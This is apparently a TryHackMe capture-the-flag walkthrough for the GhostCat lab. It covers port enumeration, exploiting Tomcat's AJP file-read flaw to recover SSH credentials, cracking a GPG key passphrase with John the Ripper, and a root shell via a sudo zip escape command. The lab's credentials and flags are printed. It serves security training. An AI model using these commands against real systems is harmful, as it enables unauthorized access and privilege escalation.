# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :--------- |
| 22 | ssh |
| 53 | tcpwrapped |
| 8009 | ajp13 |
| 8080 | http |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
| 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp open tcpwrapped syn-ack
8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods:
|_ Supported methods: GET HEAD POST OPTIONS
8080/tcp open http syn-ack Apache Tomcat 9.0.30
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



# RECONNAISSANCE
---

From the scan, we can check that we're dealing with `apache tomcat 9.0.30`, we can look up for vulnerabilities regarding this version:


![Pasted image 20250331134324.png](../../IMAGES/Pasted%20image%2020250331134324.png)

![Pasted image 20250331134331.png](../../IMAGES/Pasted%20image%2020250331134331.png)


We can look up this in `metasploit`:

![Pasted image 20250331134514.png](../../IMAGES/Pasted%20image%2020250331134514.png)

Let's test if it works:

![Pasted image 20250331134552.png](../../IMAGES/Pasted%20image%2020250331134552.png)

It works, let's proceed with exploitation.


# EXPLOITATION
---

Since we were able to read the `/WEB-INF/web.xml` file, we noticed it came with some credentials, we can access `ssh` with them:


```
skyfuck:8730281lkjlkjdqlksalks
```



![Pasted image 20250331135832.png](../../IMAGES/Pasted%20image%2020250331135832.png)

Let's begin privesc.


# PRIVILEGE ESCALATION
---


If we check `skyfuck` home, we can find this:

```
skyfuck@ubuntu:~$ ls
credential.pgp tryhackme.asc
```

We got some encrypted credentials, but to our luck we also got the `.asc` private file to decrypt, let's do it:

![Pasted image 20250331140554.png](../../IMAGES/Pasted%20image%2020250331140554.png)

If we try importing it, we notice we need a passphrase, let's use `gpg2john` to get it:

```
gpg2john tryhackme.asc > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

We get this:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru (tryhackme)
1g 0:00:00:00 DONE (2025-03-31 19:06) 16.66g/s 17866p/s 17866c/s 17866C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Passphrase is `alexandru`, let's check the credentials now:

```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

We get this:

```
gpg --decrypt credential.pgp
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
 "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

We got the credentials for another user: `merlin`, let's go into ssh:

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

We can now read `user.txt`:

```
merlin@ubuntu:~$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```


We can check our privileges:

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
 (root : root) NOPASSWD: /usr/bin/zip
```

We got root permissions on `/usr/bin/zip`, let's check it on `gtfobins`

![Pasted image 20250331141148.png](../../IMAGES/Pasted%20image%2020250331141148.png)

We can do the following in order to get an interactive shell as root:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh -c "sh <&2 1>&2"'
```

![Pasted image 20250331141357.png](../../IMAGES/Pasted%20image%2020250331141357.png)

We can now read `root.txt`:

```
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```

![Pasted image 20250331141444.png](../../IMAGES/Pasted%20image%2020250331141444.png)

